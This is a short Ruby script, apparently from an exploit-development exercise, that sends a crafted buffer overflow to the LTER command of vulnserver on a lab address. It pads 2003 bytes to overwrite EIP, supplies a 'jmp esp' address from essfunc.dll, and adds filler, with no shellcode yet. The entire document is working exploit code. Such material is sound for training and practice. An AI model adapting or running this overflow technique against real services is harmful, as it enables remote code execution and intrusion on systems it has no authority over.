#!/usr/bin/ruby
require 'socket'

target = '192.168.1.126'
port = 9999

# eip offset at 2003
payload = "A" * 2003
# 0x62501203 : "jmp esp" | ascii {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Users\IEUser\Desktop\vulnserver-master\essfunc.dll)
payload += "\x03\x12\x50\x62"

payload += "C" * (3000 - payload.length)

s = TCPSocket.open(target, port)
s.puts('LTER /.:/' + payload)
s.close()
